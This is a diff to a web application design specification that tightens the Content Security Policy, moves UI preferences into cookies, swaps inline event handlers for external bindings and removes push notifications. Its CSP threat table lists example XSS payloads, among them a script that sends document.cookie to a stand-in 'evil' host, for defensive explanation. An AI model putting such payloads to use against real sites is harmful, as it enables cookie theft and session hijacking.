@@ -3947,8 +3947,8 @@ User preferences like theme, language, and UI settings can be stored client-side
 
 | Storage | Use Case | Persistence |
 |---------|----------|-------------|
-| `localStorage` | Theme, language, UI preferences | Until cleared |
-| Cookies | Session preferences, consent flags | Configurable expiry |
+| Cookies | Theme, language, consent flags — anything the server reads to render pages | Configurable expiry |
+| `localStorage` | Client-only state the server must never receive (e.g. API tokens) | Until cleared |
 
 ## AI Implementation Process
 
@@ -13552,8 +13552,8 @@ When `DEBUG=true` is active and an error occurs, the canonical error body (PART 
     "line": 42,
     "column": 7,
     "sample": "doSomething(",
-    "matched_policy": "script-src 'self' 'unsafe-inline'",
-    "why_blocked": "inline event handler — 'unsafe-inline' applies only to <script> blocks, not on=\"...\" attributes",
+    "matched_policy": "script-src 'self'",
+    "why_blocked": "inline event handler — script-src 'self' allows no inline script of any kind (no 'unsafe-inline')",
     "fix_hint": "move the handler to an addEventListener() call in app.js"
   }
 }
@@ -13570,7 +13570,7 @@ When `DEBUG=true` is active and an error occurs, the canonical error body (PART 
 | Threat | Layer 1 (input) | Layer 2 (data access) | Layer 3 (output) | Layer 4 (transport) |
 |--------|-----------------|------------------------|-------------------|----------------------|
 | SQL injection | Strict input validation by type/format | Parameterized queries ONLY — never `fmt.Sprintf` SQL with user input | ORM/query-builder layer rejects suspicious patterns | Database user has minimum privileges (no DROP, no DDL in app role) |
-| XSS | Reject control chars / null bytes at input | n/a | HTML-escape on render (templates auto-escape; raw output requires explicit `template.HTML` cast and review) | CSP `'self' + 'unsafe-inline'` blocks cross-origin script loads (PART 11 → CSP) |
+| XSS | Reject control chars / null bytes at input | n/a | HTML-escape on render (templates auto-escape; raw output requires explicit `template.HTML` cast and review) | CSP script-src `'self'` blocks injected scripts — inline and cross-origin (PART 11 → CSP) |
 | Enumeration (account existence, valid IDs, valid tokens) | Rate limit per IP + per identifier + global | Constant-time comparison for tokens / passwords | Identical response shape and timing for "not found" vs "no access" | n/a |
 | Timing oracles | n/a | `subtle.ConstantTimeCompare` for all secret comparisons | Identical response time for success/fail by adding artificial sleep when faster than threshold | n/a |
 | Credential stuffing | Rate limit per IP + per token-prefix + global | Constant-time SHA-256 comparison (no "fast path" for invalid prefixes) | Generic "invalid token" message | Token auto-revoked after N consecutive failures |
@@ -13997,7 +13997,7 @@ Server-Timing: db;dur=12.4, render;dur=3.1, total;dur=18.7
 
 ```
 default-src 'self';
-script-src 'self' 'unsafe-inline';
+script-src 'self';
 style-src 'self' 'unsafe-inline';
 img-src 'self' data: blob: https:;
 font-src 'self' https:;
@@ -14020,7 +14020,7 @@ report-uri /api/{api_version}/server/reports/csp
 | Directive | Default | Reason |
 |-----------|---------|--------|
 | `default-src` | `'self'` | Strict baseline; all unset directives fall back here. |
-| `script-src` | `'self' 'unsafe-inline'` | `'unsafe-inline'` is the pragmatic compromise — most templates inline small scripts (analytics opt-in, theme bootstrap). Tighten with nonces if your app generates them; see "Tightening to nonce-based CSP" below. |
+| `script-src` | `'self'` | All JS lives in `static/js/app.js` — no inline scripts, no inline handlers — so `'self'` costs nothing and blocks every injected `<script>`, inline or cross-origin. |
 | `style-src` | `'self' 'unsafe-inline'` | Inline `style=""` attributes and `<style>` blocks are unavoidable in many templates and component frameworks. |
 | `img-src` | `'self' data: blob: https:` | `data:` for inline icons/SVG, `blob:` for client-side generated previews, `https:` so user avatars / CDN images / OG embeds work without per-host config. (HTTP images explicitly excluded — TLS only.) |
 | `font-src` | `'self' https:` | Web fonts (Google Fonts, FontAwesome CDN, custom CDNs) work without per-host config. HTTPS only. |
@@ -14100,7 +14100,7 @@ Server-side handling:
 
 ### Tightening to nonce-based CSP
 
-For deployments that can generate per-request nonces (most Go template setups can), drop `'unsafe-inline'` from `script-src`/`style-src` and use:
+For deployments that can generate per-request nonces (most Go template setups can), drop `'unsafe-inline'` from `style-src` too (`script-src` already ships without it) and use:
 
 ```yaml
 web:
@@ -14116,7 +14116,7 @@ The middleware substitutes `{request_nonce}` per response and adds the same nonc
 | Attack | Default policy stops it? |
 |--------|--------------------------|
 | Stored XSS injecting `<script src="https://evil.example/...">` | ✓ Yes (script-src `'self'` blocks the cross-origin load) |
-| Stored XSS injecting `<script>fetch('//evil/?'+document.cookie)</script>` | ✗ No with default (`'unsafe-inline'`); ✓ Yes with nonce-based override |
+| Stored XSS injecting `<script>fetch('//evil/?'+document.cookie)</script>` | ✓ Yes (script-src `'self'` has no `'unsafe-inline'` — all inline scripts are blocked) |
 | Clickjacking via `<iframe src="https://victim/...">` | ✓ Yes (frame-ancestors `'self'`) |
 | `<base href="https://evil/">` redirecting all relative URLs | ✓ Yes (base-uri `'self'`) |
 | Form-action hijack to `https://evil/login` | ✓ Yes (form-action `'self'`) |
@@ -14205,7 +14205,7 @@ func extractContextFromPath(path string) (*Context, error) {
 
 **`/.well-known/**` is a root-owned protocol/discovery namespace. It is NOT a general static-file bucket.**
 
-- `/.well-known/**` is reserved to the server and can NEVER be claimed by users, orgs, vanity routes, or operator-configured path settings
+- `/.well-known/**` is reserved to the server and can NEVER be claimed by user-supplied slugs, vanity routes, or operator-configured path settings
 - Well-known endpoints live only at the root `/.well-known/...` namespace, never under `/server/*` or `/api/*`
 - Only documented, allowlisted well-known entries may be served; unsupported entries MUST return `404 Not Found`
 - `GET` and `HEAD` are the only valid methods for `/.well-known/**`; other methods MUST return `405 Method Not Allowed`
@@ -15253,7 +15253,7 @@ When GDPR/CCPA (right to erasure) conflicts with HIPAA/SOC2 (retention requireme
 | `/server/privacy` | GET | Privacy policy |
 | `/server/dpo` | GET | Data Protection Officer contact (GDPR) |
 
-**Compliance is configured entirely in `server.yml`. Consent state is stored client-side (localStorage/cookies) — there is no server-side user consent table. Operators run `{project_name} compliance report` for a compliance summary.**
+**Compliance is configured entirely in `server.yml`. Consent state is stored client-side (cookies, so the server can read it per-request) — there is no server-side user consent table. Operators run `{project_name} compliance report` for a compliance summary.**
 
 ### Compliance Audit Events
 
@@ -16600,7 +16600,7 @@ type ConsentState struct {
     Timestamp   int64 `json:"timestamp"`
 }
 
-// Stored in localStorage as JSON:
+// Stored in the cookieConsent cookie as JSON (server-readable per request):
 // cookieConsent = {"essential":true,"preferences":true,"analytics":false,"timestamp":1704067200}
 ```
 
@@ -18712,13 +18712,13 @@ See the **"Themes (NON-NEGOTIABLE - PROJECT-WIDE)"** section for the complete th
 **Theme Implementation Requirements:**
 
 1. **Theme Detection:**
-   - Check `localStorage` or cookie for user preference
-   - Fall back to `prefers-color-scheme` media query if auto mode
+   - Server reads the `theme` cookie and renders the class on `<html>` — no detection JS, no FOUC
+   - `auto` (or no cookie) is pure CSS: `@media (prefers-color-scheme: light)` overrides the dark-default custom properties
    - Default to dark if no preference set
 
 2. **Theme Switching:**
    - Provide theme toggle in UI (light/dark/auto)
-   - Store preference in `localStorage` or cookie
+   - Store preference in the `theme` cookie (server-readable)
    - Apply theme class to root element (`theme-light`, `theme-dark`)
    - NO page reload required
 
@@ -21193,13 +21193,20 @@ html.theme-light {
 | Download | Downloading... |
 
 ```html
-<!-- Submit button with loading state -->
-<button type="submit" id="save-btn" onclick="this.disabled=true; this.textContent='Saving...';">
+<!-- Submit button with loading state (bound in app.js - inline handlers are never allowed) -->
+<button type="submit" id="save-btn" data-action="submit-loading" data-loading-text="Saving...">
   Save
 </button>
 ```
 
 ```javascript
+// app.js - disable button + show loading text on submit (bound via data-action)
+const btn = document.getElementById('save-btn');
+btn.closest('form').addEventListener('submit', () => {
+  btn.disabled = true;
+  btn.textContent = btn.dataset.loadingText;
+});
+
 // Re-enable after response
 fetch('/api/save', { method: 'POST', body: data })
   .then(response => { /* handle success */ })
@@ -21259,17 +21266,22 @@ fetch('/api/save', { method: 'POST', body: data })
 <dialog id="confirm-modal" aria-labelledby="modal-title">
   <header>
     <h2 id="modal-title">Modal Title</h2>
-    <button type="button" aria-label="Close" onclick="this.closest('dialog').close()">✕</button>
+    <!-- form method="dialog" closes the dialog with zero JS (CSP-safe) -->
+    <form method="dialog">
+      <button aria-label="Close">✕</button>
+    </form>
   </header>
   <main>Modal content here</main>
   <footer>
-    <button type="button" onclick="this.closest('dialog').close()">Cancel</button>
+    <form method="dialog">
+      <button>Cancel</button>
+    </form>
     <button type="submit" autofocus>Confirm</button>
   </footer>
 </dialog>
 ```
 
-**Note:** Native `<dialog>` element handles focus trap and backdrop automatically. Use `showModal()` to open with backdrop, `close()` to close.
+**Note:** Native `<dialog>` element handles focus trap and backdrop automatically. Use `showModal()` to open with backdrop; close/cancel buttons use `<form method="dialog">` — zero JS and CSP-safe.
 
 ### Toast vs Modal: When to Use Which
 
@@ -21367,6 +21379,8 @@ function deleteItem(itemId) {
 
 **In-app notifications for immediate feedback. Follows common patterns (GitHub, GitLab, Slack).**
 
+**No-JS fallback:** toasts are a JS enhancement for AJAX actions. Non-AJAX form POSTs get a server-rendered flash message instead — rendered into the page on the post-submit redirect and auto-faded via CSS animation — so action feedback works without JavaScript.
+
 **Toast Behavior Rules:**
 
 | Rule | Value | Description |
@@ -21444,6 +21458,11 @@ function deleteItem(itemId) {
 
 @keyframes slideIn { from { transform: translateX(100%); opacity: 0; } }
 @keyframes countdown { from { width: 100%; } to { width: 0%; } }
+
+/* Pause on hover is pure CSS - JS only syncs the removal timer */
+.toast:hover .toast-progress {
+  animation-play-state: paused;
+}
 ```
 
 **JavaScript Toast API:**
@@ -21465,75 +21484,93 @@ dismissToast(toastId);
 dismissAllToasts();
 ```
 
-### Notification Bell
+### Site Banner
 
-**Built-in notification center accessible via bell icon in header. Follows GitHub/GitLab patterns.**
+**Site-wide announcements (scheduled maintenance, service notices) are a server-rendered banner — the FIRST element inside `<body>`, before `<main>`. No notification center, no bell icon — API projects have no user accounts and no server-side notification storage (see PART 17 → "Notification Storage"). The banner renders and dismisses without JavaScript; JS only makes dismissal reload-free.**
 
-**Bell Icon Behavior:**
-
-| Feature | Description |
-|---------|-------------|
-| **Position** | Header, right side, before profile icon |
-| **Icon** | Bell outline (empty = no unread), filled (has unread) |
-| **Badge** | Red dot or count (1-9, then "9+") for unread |
-| **Click** | Opens dropdown panel below bell |
-| **Keyboard** | Enter/Space opens dropdown, Escape closes |
-
-**Dropdown Panel:**
+**Banner Behavior:**
 
 | Feature | Description |
 |---------|-------------|
-| **Position** | Below bell icon, right-aligned |
-| **Width** | 320-400px |
-| **Max height** | 400px (scrollable) |
-| **Empty state** | "No notifications" message |
-| **Header** | "Notifications" title + "Mark all read" link |
-| **Footer** | "View all notifications" link to `/users/notifications` |
-
-**Notification Item:**
-
-| Element | Description |
-|---------|-------------|
-| **Icon** | Type indicator (info, success, warning, error) |
-| **Title** | Brief notification title |
-| **Message** | Short description (truncated if long) |
-| **Timestamp** | Relative time ("2m ago", "1h ago", "Yesterday") |
-| **Unread indicator** | Blue dot on left side |
-| **Click behavior** | Mark as read + navigate to related page |
+| **Source** | `web.announcements` config (see "Announcements"); each message whose `start`–`end` window is active renders as a banner; disabled or empty list = no banner |
+| **Placement** | Immediately after `<body>`, before `<main>` — rendered server-side in the base template, so there is no layout shift and no JS dependency |
+| **Types** | `info`, `warning`, `error`, `success` |
+| **ARIA** | `role="status"` for `info` and `success`; `role="alert"` for `warning` and `error` |
+| **Dismissal** | X button (only when `dismissible: true`) is a tiny POST form — the server appends the announcement `id` to the `dismissed_announcements` cookie (comma-separated ids), redirects back, and skips rendering dismissed announcements entirely; changing the `id` reshows the banner for everyone. Works with zero JS; external JS intercepts to dismiss without reload |
+| **Expiry** | Per-announcement `start`/`end` (ISO 8601, UTC); outside the window = banner not rendered |
+| **Stacking** | Multiple active announcements stack in config order; cookie consent and the PWA update banner share the slot, ordered: cookie consent → announcements → PWA update |
 
 **HTML Structure:**
 ```html
-<div class="header-actions">
-  <!-- Notification Bell -->
-  <div class="notification-bell" aria-label="Notifications">
-    <button class="bell-button" aria-haspopup="true" aria-expanded="false">
-      <svg class="bell-icon"><!-- bell SVG --></svg>
-      <span class="badge" aria-label="3 unread">3</span>
-    </button>
-    <div class="notification-dropdown" role="menu" hidden>
-      <div class="dropdown-header">
-        <span>Notifications</span>
-        <button class="mark-all-read">Mark all read</button>
-      </div>
-      <div class="notification-list">
-        <a href="/users/settings" class="notification-item unread">
-          <span class="notification-dot"></span>
-          <span class="notification-icon">ℹ</span>
-          <div class="notification-content">
-            <span class="notification-title">Settings updated</span>
-            <span class="notification-message">Your preferences were saved</span>
-            <span class="notification-time">2m ago</span>
-          </div>
-        </a>
-        <!-- More items... -->
-      </div>
-      <a href="/users/notifications" class="dropdown-footer">View all</a>
-    </div>
+<body>
+  <!-- Rendered only when the id is absent from the dismissed_announcements cookie -->
+  <div class="site-banner site-banner-warning" role="alert" data-announcement-id="maintenance-2025-01">
+    <span class="site-banner-icon" aria-hidden="true">⚠</span>
+    <span class="site-banner-text">Scheduled maintenance: 2026-07-06 02:00–04:00 UTC</span>
+    <!-- Dismissal works with zero JS - the server appends the id to the cookie and redirects back -->
+    <form method="post" action="/announcements/dismiss" class="site-banner-dismiss">
+      <input type="hidden" name="id" value="maintenance-2025-01">
+      <button type="submit" class="site-banner-close" aria-label="Dismiss announcement">&times;</button>
+    </form>
   </div>
 
-  <!-- Profile Icon -->
-  <div class="profile-menu"><!-- See below --></div>
-</div>
+  <main>
+    <!-- Page content -->
+  </main>
+</body>
+```
+
+**CSS:**
+```css
+.site-banner {
+  display: flex;
+  align-items: center;
+  gap: 0.5rem;
+  padding: 0.5rem 1rem;
+  font-size: 0.875rem;
+  background: var(--color-info-bg);
+  color: var(--color-info-text);
+}
+
+.site-banner-warning, .site-banner-error {
+  background: var(--color-warning-bg);
+  color: var(--color-warning-text);
+}
+
+.site-banner-text {
+  flex: 1;
+  text-align: center;
+}
+
+.site-banner-close {
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: inherit;
+  font-size: 1.25rem;
+  line-height: 1;
+}
+```
+
+**Dismissal JavaScript (enhancement only — the form POST works without it):**
+```javascript
+// Intercept the dismiss form to skip the reload; the cookie stays
+// server-readable so dismissed announcements are never rendered again.
+// Dismissal is keyed on the announcement id — changing the id resets dismissals
+document.querySelectorAll(".site-banner .site-banner-dismiss").forEach((form) => {
+  form.addEventListener("submit", (event) => {
+    event.preventDefault();
+    const banner = form.closest(".site-banner");
+    const match = document.cookie.match(/(?:^|;\s*)dismissed_announcements=([^;]*)/);
+    const ids = match ? decodeURIComponent(match[1]).split(",") : [];
+    if (!ids.includes(banner.dataset.announcementId)) {
+      ids.push(banner.dataset.announcementId);
+    }
+    document.cookie = "dismissed_announcements=" + encodeURIComponent(ids.join(",")) +
+      "; path=/; max-age=31536000; SameSite=Lax";
+    banner.remove();
+  });
+});
 ```
 
 ### Theme Toggle
@@ -21546,8 +21583,9 @@ dismissAllToasts();
 |---------|-------------|
 | **Position** | Header, right side, last item |
 | **Options** | Dark / Light / Auto (follows OS preference) |
-| **Persistence** | `localStorage` key `theme` |
+| **Persistence** | `theme` cookie (`light` \| `dark` \| `auto`) — server-readable, so the theme class is rendered on `<html>` with no init JS and no FOUC |
 | **Keyboard** | Enter/Space cycles modes |
+| **No-JS fallback** | Auto theming works from pure CSS (`prefers-color-scheme`); switching without JS uses a small `<noscript>` form POSTing to the theme endpoint |
 
 **HTML Structure:**
 ```html
@@ -21568,68 +21606,13 @@ dismissAllToasts();
   gap: 1rem;
 }
 
-.notification-bell, .profile-menu {
-  position: relative;
-}
-
-.bell-button, .profile-button {
+.theme-toggle {
   background: none;
   border: none;
   cursor: pointer;
   display: flex;
   align-items: center;
   gap: 0.25rem;
-}
-
-.badge {
-  position: absolute;
-  top: -4px;
-  right: -4px;
-  background: var(--color-danger);
-  color: white;
-  font-size: 0.75rem;
-  min-width: 18px;
-  height: 18px;
-  border-radius: 9px;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-}
-
-.avatar {
-  width: 32px;
-  height: 32px;
-  border-radius: 50%;
-  object-fit: cover;
-}
-
-.notification-dropdown, .profile-dropdown {
-  position: absolute;
-  top: 100%;
-  right: 0;
-  margin-top: 0.5rem;
-  background: var(--color-bg);
-  border: 1px solid var(--color-border);
-  border-radius: 6px;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.15);
-  z-index: 1000;
-}
-
-.dropdown-item {
-  display: block;
-  padding: 0.5rem 1rem;
-  color: inherit;
-  text-decoration: none;
-}
-
-.dropdown-item:hover {
-  background: var(--color-hover);
-}
-
-.dropdown-divider {
-  height: 1px;
-  background: var(--color-border);
-  margin: 0.5rem 0;
 }
 ```
 
@@ -21644,7 +21627,6 @@ dismissAllToasts();
 | No search results | "No results found for '{query}'" | Suggest clearing filters or different search |
 | Empty list | "No {items} yet" | "Create your first {item}" button |
 | Empty table | Friendly message in table body | Action button or instructions |
-| No notifications | "No notifications" | - |
 | Failed to load | Error message | "Retry" button |
 | No permissions | "You don't have access to this" | Link to request access or go back |
 
@@ -21668,6 +21650,8 @@ dismissAllToasts();
 ### Form Validation
 
 **All forms MUST provide clear, inline validation feedback.**
+
+**HTML5 first:** `required`, `pattern`, `min`/`max`, and `type="email"`/`type="url"`/`type="number"` are the first line of validation (see the "HTML5 & CSS Over JavaScript" table) — the browser blocks invalid submits with zero JS. CSS `:user-invalid` handles error-after-interaction styling with zero JS. JS only mirrors the field's `validationMessage` into the styled message element.
 
 | Rule | Implementation |
 |------|----------------|
@@ -21715,6 +21699,13 @@ dismissAllToasts();
 
 **CSS for Validation States:**
 ```css
+/* Zero-JS error styling - :user-invalid matches only after interaction */
+input:user-invalid,
+select:user-invalid,
+textarea:user-invalid {
+  border-color: var(--color-error);
+}
+
 .form-group.error input,
 .form-group.error select,
 .form-group.error textarea {
@@ -21762,7 +21753,7 @@ dismissAllToasts();
 
 ## PWA Support
 
-**Progressive Web App = Native-like web app (installable, offline, push notifications, GPS)**
+**Progressive Web App = Native-like web app (installable, offline, GPS)**
 
 **Goal: Indistinguishable from native app** - same UX, capabilities, and performance.
 
@@ -21770,10 +21761,9 @@ dismissAllToasts();
 |---------|----------------|-------|
 | **Manifest** | `/manifest.json` with app metadata | Required for install |
 | **Icons** | Multiple sizes including maskable | For all platforms |
-| **Service Worker** | Cache, push, background sync, offline | Core of PWA |
+| **Service Worker** | Cache, background sync, offline | Core of PWA |
 | **Installable** | Meets PWA install criteria | Add to home screen |
 | **HTTPS** | Required for service workers | Non-negotiable |
-| **Push Notifications** | Web Push API via Service Worker | User opt-in required |
 | **Geolocation** | GPS access via Geolocation API | User permission required |
 | **Background Sync** | Queue actions when offline, sync when online | Seamless offline |
 | **App Updates** | Detect new SW version, prompt user | Keep app current |
@@ -21949,11 +21939,15 @@ setInterval(() => {
 function showUpdateNotification() {
   const banner = document.createElement('div');
   banner.className = 'update-banner';
-  banner.innerHTML = `
-    <span>A new version is available</span>
-    <button onclick="updateApp()">Update Now</button>
-    <button onclick="this.parentElement.remove()">Later</button>
-  `;
+  const label = document.createElement('span');
+  label.textContent = 'A new version is available';
+  const updateBtn = document.createElement('button');
+  updateBtn.textContent = 'Update Now';
+  updateBtn.addEventListener('click', updateApp);
+  const laterBtn = document.createElement('button');
+  laterBtn.textContent = 'Later';
+  laterBtn.addEventListener('click', () => banner.remove());
+  banner.append(label, updateBtn, laterBtn);
   document.body.appendChild(banner);
 }
 
@@ -22034,102 +22028,6 @@ function isInstalledPWA() {
 | Already installed (standalone mode) | ❌ No |
 | iOS Safari (no prompt event) | ✅ Yes (manual instructions) |
 | Desktop browser | ✅ Yes (if supported) |
-
-### Push Notifications (PWA)
-
-**Push notifications work even when app is closed (like native apps).**
-
-| Component | Purpose |
-|-----------|---------|
-| **Service Worker** | Receives push events, shows notifications |
-| **Push API** | Subscribe to push service |
-| **Notifications API** | Display system notifications |
-| **VAPID Keys** | Server authentication for push |
-
-**User must grant permission** - prompt on first relevant action, not page load.
-
-```javascript
-// Request permission and subscribe
-async function subscribeToPush() {
-  // Check support
-  if (!('PushManager' in window)) {
-    console.log('Push not supported');
-    return null;
-  }
-
-  // Request permission
-  const permission = await Notification.requestPermission();
-  if (permission !== 'granted') {
-    console.log('Notification permission denied');
-    return null;
-  }
-
-  // Subscribe
-  const registration = await navigator.serviceWorker.ready;
-  const subscription = await registration.pushManager.subscribe({
-    userVisibleOnly: true,
-    applicationServerKey: urlBase64ToUint8Array(VAPID_PUBLIC_KEY)
-  });
-
-  // Send subscription to server
-  await fetch('/api/push/subscribe', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify(subscription)
-  });
-
-  return subscription;
-}
-
-// Helper: Convert VAPID key
-function urlBase64ToUint8Array(base64String) {
-  const padding = '='.repeat((4 - base64String.length % 4) % 4);
-  const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
-  const rawData = window.atob(base64);
-  return Uint8Array.from([...rawData].map(char => char.charCodeAt(0)));
-}
-```
-
-**Service Worker - handle push:**
-```javascript
-// sw.js
-self.addEventListener('push', event => {
-  const data = event.data?.json() || {};
-  const options = {
-    body: data.body || 'New notification',
-    icon: '/static/icons/icon-192.png',
-    badge: '/static/icons/badge-72.png',
-    vibrate: [100, 50, 100],
-    data: { url: data.url || '/' },
-    actions: data.actions || []
-  };
-
-  event.waitUntil(
-    self.registration.showNotification(data.title || '{App Name}', options)
-  );
-});
-
-// Handle notification click
-self.addEventListener('notificationclick', event => {
-  event.notification.close();
-
-  const url = event.notification.data?.url || '/';
-  event.waitUntil(
-    clients.matchAll({ type: 'window' }).then(windowClients => {
-      // Focus existing window if open
-      for (const client of windowClients) {
-        if (client.url === url && 'focus' in client) {
-          return client.focus();
-        }
-      }
-      // Open new window
-      return clients.openWindow(url);
-    })
-  );
-});
-```
-
-**Push notification settings** are configured via `server.notifications` config keys.
 
 ### Background Sync
 
@@ -22316,9 +22214,9 @@ async function checkLocationPermission() {
 
 | Storage | Use Case | Cleared |
 |---------|----------|---------|
-| **localStorage** | API token (optional), UI preferences | Manual/revocation |
+| **localStorage** | API token (optional) | Manual/revocation |
 | **IndexedDB** | Offline data, cached responses | Manual/revocation |
-| **Cookies** | Bearer token (httpOnly fallback) | Expiry/revocation |
+| **Cookies** | Bearer token (httpOnly fallback), UI preferences (theme, lang) | Expiry/revocation |
 
 **Token persists when:**
 - App is closed and reopened
@@ -22341,45 +22239,34 @@ async function revokeLocalToken() {
     }
   }
 
-  // Unsubscribe from push (was associated with token)
-  const registration = await navigator.serviceWorker.ready;
-  const subscription = await registration.pushManager.getSubscription();
-  if (subscription) {
-    await subscription.unsubscribe();
-  }
-
   // Reload page — public content still accessible
   window.location.reload();
 }
 ```
 
-### Client-Side Preferences (localStorage)
+### Client-Side Preferences (cookies)
 
-**User preferences are stored in localStorage — zero server persistence, zero user account needed.**
+**User preferences are stored in cookies — the server reads them to render pages (theme class, language) with zero server persistence and zero user account needed. localStorage is reserved for values the server must never receive automatically (the API token).**
 
-| Key | Values | Default |
-|-----|--------|---------|
-| `theme` | `"dark"` \| `"light"` \| `"auto"` | `"dark"` |
-| `lang` | BCP 47 tag: `"en"`, `"es"`, `"fr"`, … | Browser `navigator.language` |
-| `cookieConsent` | `"accepted"` \| `"declined"` | unset (banner shown) |
-| `ccpaDoNotSell` | `"true"` | unset |
+| Cookie | Values | Default |
+|--------|--------|---------|
+| `theme` | `dark` \| `light` \| `auto` | `dark` |
+| `lang` | BCP 47 tag: `en`, `es`, `fr`, … | `Accept-Language` header |
+| `cookieConsent` | JSON: granular categories + timestamp | unset (banner shown) |
+| `ccpa_opt_out` | `true` | unset |
 
-**Preference reads/writes:**
+**Preference writes (JS enhancement — the server sets the same cookies on its POST endpoints):**
 ```javascript
-// Read with default fallback
-const theme = localStorage.getItem('theme') ?? 'dark';
-const lang  = localStorage.getItem('lang')  ?? navigator.language.split('-')[0] ?? 'en';
-
-// Write
-localStorage.setItem('theme', 'light');
-localStorage.setItem('lang', 'fr');
+// Write - the server reads these on the next request
+document.cookie = "theme=light; path=/; max-age=31536000; SameSite=Lax";
+document.cookie = "lang=fr; path=/; max-age=31536000; SameSite=Lax";
 ```
 
 **Rules:**
 - Preferences survive token revocation — they are UI state, not account data
-- Never sync preferences to the server — they live entirely on the client
-- Never store PII in localStorage
-- Always read with a safe default fallback
+- Never persist preferences server-side — the server reads the cookie per request; there is no preferences table
+- Never store PII in cookies or localStorage
+- Always fall back to a safe default when a cookie is missing or invalid
 
 ### Offline Behavior
 
@@ -22602,7 +22489,6 @@ if (new URLSearchParams(window.location.search).get('source') === 'pwa') {
 
 | Feature | Android | iOS |
 |---------|---------|-----|
-| Push notifications | ✅ Yes | ✅ Yes (iOS 16.4+) |
 | Background sync | ✅ Yes | ❌ No |
 | `beforeinstallprompt` | ✅ Yes | ❌ No |
 | Persistent storage | ✅ Yes | ⚠️ Limited (7 days without use) |
@@ -22752,8 +22638,7 @@ async function requestPersistentStorage() {
 │   │   ├── icon-384.png
 │   │   ├── icon-512.png
 │   │   ├── icon-maskable-192.png # Maskable (Android adaptive)
-│   │   ├── icon-maskable-512.png
-│   │   └── badge-72.png          # Notification badge
+│   │   └── icon-maskable-512.png
 │   ├── splash/                   # iOS splash screens
 │   │   ├── iphone-1179x2556.png
 │   │   └── iphone-1284x2778.png
@@ -22779,7 +22664,6 @@ async function requestPersistentStorage() {
 | Install prompt handled | ◻️ | Custom UI |
 | Update notification | ◻️ | New SW prompt |
 | Offline indicator | ◻️ | Connection status |
-| Push notifications | ◻️ | If needed |
 | Background sync | ◻️ | If needed |
 | Geolocation | ◻️ | If needed |
 | Lighthouse score 100 | ◻️ | All audits pass |
@@ -23087,7 +22971,7 @@ Quick reference: Default allows all origins (`*`). Configure via `web.cors` in s
 | Collapsible sections | `<details>/<summary>` | Need animation or programmatic control |
 | Tabs | CSS `:target` or radio button hack | Need deep linking or state management |
 | Tooltips | CSS `::after` with `data-tooltip` | Need dynamic positioning |
-| Modals | CSS `:target` selector | Need focus trap, escape key, backdrop click |
+| Modals | Native `<dialog>` (provides focus trap, Esc, and `::backdrop` natively) | Only `showModal()` to open; closing uses `<form method="dialog">` |
 | Hover effects | CSS `:hover`, `:focus`, `:active` | Never - always CSS |
 | Animations | CSS `@keyframes`, `transition` | Complex sequenced animations |
 | Responsive design | CSS media queries | Never - always CSS |
@@ -23116,26 +23000,69 @@ Quick reference: Default allows all origins (`*`). Configure via `web.cors` in s
 - **Required for**: API calls, dynamic content loading, complex state, WebSockets
 - **Size matters** - keep JS minimal, no large libraries for simple tasks
 
-**Inline JavaScript - Allowed for simple operations:**
+**Small JS Behaviors (external file) — inline handlers are NEVER allowed (the CSP blocks `onclick`/`onchange`):**
+
+Prefer zero-JS HTML5 equivalents first:
+
 ```html
-<!-- Navigation -->
-<button onclick="history.back()">Go Back</button>
-<button onclick="history.forward()">Go Forward</button>
-<button onclick="location.reload()">Refresh</button>
+<!-- Scroll - pure HTML/CSS, no JS -->
+<a href="#top">Back to top</a>
 
-<!-- Print -->
-<button onclick="window.print()">Print</button>
-
-<!-- Scroll -->
-<button onclick="window.scrollTo(0,0)">Back to Top</button>
-
-<!-- Form helpers -->
-<button onclick="document.getElementById('myform').reset()">Reset Form</button>
-<button onclick="document.getElementById('field').select()">Select All</button>
+<!-- Form reset - native button type, no JS -->
+<form id="myform">
+  <button type="reset">Reset Form</button>
+</form>
 ```
 
-**Rule:** Inline JS is fine for one-liner operations that cannot be done with CSS/HTML5.
-Move to `static/js/app.js` if logic needs feedback, reuse, or exceeds one statement.
+```css
+/* Smooth scrolling for the #top anchor */
+html {
+  scroll-behavior: smooth;
+}
+
+/* Respect reduced-motion preference */
+@media (prefers-reduced-motion: reduce) {
+  html {
+    scroll-behavior: auto;
+  }
+}
+```
+
+Behaviors with no HTML5 equivalent are bound in `static/js/app.js` via `addEventListener` on data-attributes or IDs:
+
+```html
+<!-- Navigation -->
+<button data-action="back">Go Back</button>
+<button data-action="forward">Go Forward</button>
+<button data-action="reload">Refresh</button>
+
+<!-- Print -->
+<button data-action="print">Print</button>
+
+<!-- Form helpers -->
+<button data-action="select-all" data-target="field">Select All</button>
+```
+
+```javascript
+// static/js/app.js - small behavior bindings (one place, CSP-safe)
+const actions = {
+  back: () => history.back(),
+  forward: () => history.forward(),
+  reload: () => location.reload(),
+  print: () => window.print(),
+  'select-all': (btn) => document.getElementById(btn.dataset.target).select()
+};
+
+document.querySelectorAll('[data-action]').forEach((btn) => {
+  const handler = actions[btn.dataset.action];
+  if (handler) {
+    btn.addEventListener('click', () => handler(btn));
+  }
+});
+```
+
+**Rule:** These buttons are enhancements — hide them until JS runs if their action is JS-only.
+Keep bindings in `static/js/app.js`; never emit inline `onclick`/`onchange` attributes.
 See **JavaScript Rules** section below for `app.js` structure.
 
 **CSS-First Patterns (use these instead of JS):**
@@ -23298,8 +23225,6 @@ src/server/template/
 **Public nav contains (project-specific):**
 - Home (`/`)
 - App-specific feature pages (e.g., API docs, features, pricing)
-- Login link (if authentication is a project feature)
-- User menu (if logged in): Settings, Logout
 
 **Public nav NEVER contains:**
 - ❌ Any link to server-administration paths (there is no admin web UI)
@@ -23323,7 +23248,8 @@ src/server/template/
 **Layout starts with:**
 ```html
 <!DOCTYPE html>
-<html lang="{{.Lang}}" dir="{{.Dir}}" class="theme-dark">  <!-- or theme-light -->
+<!-- Server renders theme-dark, theme-light, or theme-auto from the theme cookie -->
+<html lang="{{.Lang}}" dir="{{.Dir}}" class="theme-{{.Theme}}">
 <head>
   {{ template "head" . }}
 </head>
@@ -23363,22 +23289,32 @@ html.theme-light {
 **Theme preference source:**
 | Context | Preference Source | Fallback |
 |---------|-------------------|----------|
-| All users | `localStorage.theme` | `dark` |
+| All users | `theme` cookie (`light` \| `dark` \| `auto`), read server-side | `dark` |
+
